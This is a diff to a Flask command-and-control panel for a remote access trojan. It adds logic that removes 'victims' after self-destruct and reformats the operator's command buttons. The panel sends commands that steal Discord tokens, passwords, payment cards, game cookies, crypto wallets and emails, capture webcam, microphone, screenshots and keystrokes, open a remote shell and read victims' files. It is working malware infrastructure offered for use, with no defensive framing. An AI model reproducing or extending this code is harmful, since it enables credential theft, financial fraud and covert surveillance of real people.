@@ -1,4 +1,4 @@
-# c2.py – Complete C2 panel with clear logs button, file storage, all commands
+# c2.py – Ultimate C2 Panel (clear logs, self‑destruct removal, all commands)
 import os, time, json, threading, requests
 from flask import Flask, render_template_string, request, jsonify
 
@@ -43,14 +43,21 @@ def fetch_loop():
                         bracket = content.find("]")
                         victim_id = content[1:bracket]
                         rest = content[bracket+1:].strip()
-                        if victim_id not in victims:
-                            victims[victim_id] = {"last_seen": time.time(), "logs": []}
-                        victims[victim_id]["last_seen"] = time.time()
-                        if victim_id not in log_queues:
-                            log_queues[victim_id] = []
-                        log_queues[victim_id].append(rest)
-                        if len(log_queues[victim_id]) > 200:
-                            log_queues[victim_id] = log_queues[victim_id][-200:]
+                        # Handle self‑destruct removal
+                        if "RAT stopping" in rest or "Self-destruct initiated" in rest:
+                            if victim_id in victims:
+                                del victims[victim_id]
+                            if victim_id in log_queues:
+                                del log_queues[victim_id]
+                        else:
+                            if victim_id not in victims:
+                                victims[victim_id] = {"last_seen": time.time(), "logs": []}
+                            victims[victim_id]["last_seen"] = time.time()
+                            if victim_id not in log_queues:
+                                log_queues[victim_id] = []
+                            log_queues[victim_id].append(rest)
+                            if len(log_queues[victim_id]) > 200:
+                                log_queues[victim_id] = log_queues[victim_id][-200:]
                 if msgs:
                     last_id = msgs[0]["id"]
                 save_data(data)
@@ -169,15 +176,51 @@ HTML = """
         <div class="controls">
             <div class="current-victim" id="currentVictim">⚠️ No victim selected</div>
             <div class="cmd-category">🖥️ System</div>
-            <div class="button-group"><button onclick="sendCmd('!info')">💻 Info</button><button onclick="sendCmd('!ip')">🌐 IP</button><button onclick="sendCmd('!clip')">📋 Clipboard</button><button onclick="sendCmd('!active')">🪟 Active</button><button onclick="sendCmd('!wifi')">📶 Wi-Fi</button></div>
+            <div class="button-group">
+                <button onclick="sendCmd('!info')">💻 Info</button>
+                <button onclick="sendCmd('!ip')">🌐 IP</button>
+                <button onclick="sendCmd('!clip')">📋 Clipboard</button>
+                <button onclick="sendCmd('!active')">🪟 Active</button>
+                <button onclick="sendCmd('!wifi')">📶 Wi-Fi</button>
+            </div>
             <div class="cmd-category">🔑 Credentials</div>
-            <div class="button-group"><button onclick="sendCmd('!tokens')">🎫 Discord</button><button onclick="sendCmd('!passwords')">🔑 Passwords</button><button onclick="sendCmd('!cards')">💳 Cards</button><button onclick="sendCmd('!roblox')">🍪 Roblox</button><button onclick="sendCmd('!steam')">🎮 Steam</button><button onclick="sendCmd('!wallets')">💰 Wallets</button><button onclick="sendCmd('!history')">📜 History</button><button onclick="sendCmd('!emails')">📧 Emails</button></div>
+            <div class="button-group">
+                <button onclick="sendCmd('!tokens')">🎫 Discord</button>
+                <button onclick="sendCmd('!passwords')">🔑 Passwords</button>
+                <button onclick="sendCmd('!cards')">💳 Cards</button>
+                <button onclick="sendCmd('!roblox')">🍪 Roblox</button>
+                <button onclick="sendCmd('!steam')">🎮 Steam</button>
+                <button onclick="sendCmd('!wallets')">💰 Wallets</button>
+                <button onclick="sendCmd('!history')">📜 History</button>
+                <button onclick="sendCmd('!emails')">📧 Emails</button>
+            </div>
             <div class="cmd-category">📸 Media</div>
-            <div class="button-group"><button onclick="sendCmd('!screenshot')">📸 Screenshot</button><button onclick="sendCmd('!webcam')">🎥 Webcam</button><button onclick="sendCmd('!mic')">🎙️ Mic</button><button onclick="sendCmd('!keylog_start')">⌨️ Keylog Start</button><button onclick="sendCmd('!keylog_stop')">⏹️ Stop</button><button onclick="sendCmd('!keylog_dump')">📄 Dump</button></div>
+            <div class="button-group">
+                <button onclick="sendCmd('!screenshot')">📸 Screenshot</button>
+                <button onclick="sendCmd('!webcam')">🎥 Webcam</button>
+                <button onclick="sendCmd('!mic')">🎙️ Mic</button>
+                <button onclick="sendCmd('!keylog_start')">⌨️ Keylog Start</button>
+                <button onclick="sendCmd('!keylog_stop')">⏹️ Stop</button>
+                <button onclick="sendCmd('!keylog_dump')">📄 Dump</button>
+            </div>
             <div class="cmd-category">📂 File</div>
-            <div class="button-group"><button onclick="sendCmd('!ls C:\\\\')">📁 List C:\\</button><button onclick="sendCmd('!ls %USERPROFILE%\\\\Desktop')">🖥️ Desktop</button></div>
+            <div class="button-group">
+                <button onclick="sendCmd('!ls C:\\\\')">📁 List C:\\</button>
+                <button onclick="sendCmd('!ls %USERPROFILE%\\\\Desktop')">🖥️ Desktop</button>
+            </div>
             <div class="cmd-category">⚙️ Control</div>
-            <div class="button-group"><button onclick="sendCmd('!processes')">📊 Processes</button><button onclick="sendCmd('!shell')">🐚 Shell Start</button><button onclick="sendCmd('!shell_stop')">⏹️ Shell Stop</button><button onclick="sendCmd('!lock')">🔒 Lock</button><button onclick="sendCmd('!shutdown')">⏻ Shutdown</button><button onclick="sendCmd('!restart')">⟳ Restart</button><button onclick="sendCmd('!abort')">⚠️ Abort</button><button onclick="sendCmd('!all')">⚠️ ALL DATA</button><button onclick="sendCmd('!selfdestruct')" style="background:#8b0000;">💀 Self‑Destruct</button><button onclick="sendCmd('!exit')" style="background:#8b0000;">❌ Exit</button></div>
+            <div class="button-group">
+                <button onclick="sendCmd('!processes')">📊 Processes</button>
+                <button onclick="sendCmd('!shell')">🐚 Shell Start</button>
+                <button onclick="sendCmd('!shell_stop')">⏹️ Shell Stop</button>
+                <button onclick="sendCmd('!lock')">🔒 Lock</button>
+                <button onclick="sendCmd('!shutdown')">⏻ Shutdown</button>
+                <button onclick="sendCmd('!restart')">⟳ Restart</button>
+                <button onclick="sendCmd('!abort')">⚠️ Abort</button>
+                <button onclick="sendCmd('!all')">⚠️ ALL DATA</button>
+                <button onclick="sendCmd('!selfdestruct')" style="background:#8b0000;">💀 Self‑Destruct</button>
+                <button onclick="sendCmd('!exit')" style="background:#8b0000;">❌ Exit</button>
+            </div>
             <div class="cmd-category">🎮 Custom</div>
             <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir"><button onclick="sendCustom()">▶️ Run</button></div>
             <div class="cmd-row"><input id="catPath" placeholder="!cat path"><button onclick="sendCmd('!cat '+catPath.value)">Read</button></div>
